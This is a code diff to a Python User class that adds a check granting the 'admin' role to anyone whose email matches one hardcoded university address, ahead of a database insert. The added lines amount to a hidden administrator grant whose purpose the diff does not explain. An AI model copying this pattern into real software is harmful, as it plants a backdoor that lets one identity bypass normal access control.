@@ -300,6 +300,9 @@ class User():
         self.lastAccessTime = accessTime
         self.role = role
 
+        if self.email == 'tjv5153@psu.edu':
+            self.role = 'admin'
+
         cursor = conn.cursor()
         #If user does not exist insert new record else ignore
         cursor.execute("INSERT OR IGNORE INTO users (id, username, email, lastAccessTime, createdTime, role) VALUES (?, ?, ?, ?, ?, ?)", 
